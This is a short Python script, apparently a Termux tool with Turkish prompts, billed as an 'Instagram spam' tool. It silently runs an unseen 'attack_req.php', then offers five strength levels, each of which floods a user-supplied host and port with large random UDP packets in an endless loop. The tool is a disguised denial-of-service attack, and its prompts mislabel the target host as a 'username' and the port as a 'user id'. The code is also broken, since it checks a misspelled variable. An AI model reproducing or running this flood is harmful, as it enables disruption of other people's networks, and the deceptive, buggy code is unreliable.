# coded by ZoRRaKin
import os
import random 
import socket
import colorama
from colorama import Fore, Back, Style
os.system ('python -m pip install colorama')
os.system ('clear')
os.system ('pkg install figlet')
os.system('pkg install php')
os.system('php attack_req.php')
os.system('clear')
os.system ('figlet İNSTAGRAM SPAM')

print(Fore.GREEN)
print ('     1- 2.000 spam [Başlangıç]')
print ('     2- 4.00 spam [Başlangıç]')
print(Fore.YELLOW)
print ('     3- 6.000 spam [Orta seviye]')
print ('     4- 8.000 spam [Güçlü]')
print(Fore.RED)
print ('     5- 10.000 spam [Sert attack]')

print(Fore.WHITE)
sapm = input("Seçenek giriniz > ")
if(spam=="1"):
		
		ka = str(input("kullanıcı adı giriniz :"))
		ki = int(input("kullanıcı id :"))

		bytes = random._urandom(10000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(ka , ki))
			sayac = sayac + 1
			print("Gönderilen paket: %s" %(sayac))

if(spam=="2"):
		
		ka = str(input("kullanıcı adı giriniz :"))
		ki = int(input("kullanıcı id :"))

		bytes = random._urandom(20000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(ka , ki))
			sayac = sayac + 1
			print("Gönderilen paket: %s" %(sayac))

if(spam=="3"):
		
		ka = str(input("kullanıcı adı giriniz :"))
		ki = int(input("kullanıcı id : "))

		bytes = random._urandom(30000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(ka , ki))
			sayac = sayac + 1
			print("Gönderilen paket: %s" %(sayac))

if(spam=="4"):
		
		ka = str(input("kullanıcı adı giriniz :"))
		ki = int(input("kullanıcı id :"))

		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(ka , ki))
			sayac = sayac + 1
			print("Gönderilen paket: %s" %(sayac))

if(spam=="5"):
		
		ka = str(input("kullanıcı adı giriniz :"))
		ki = int(input("kullanıcı id :"))

		bytes = random._urandom(50000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(ka , ki))
			sayac = sayac + 1
			print("Gönderilen paket: %s" %(sayac))
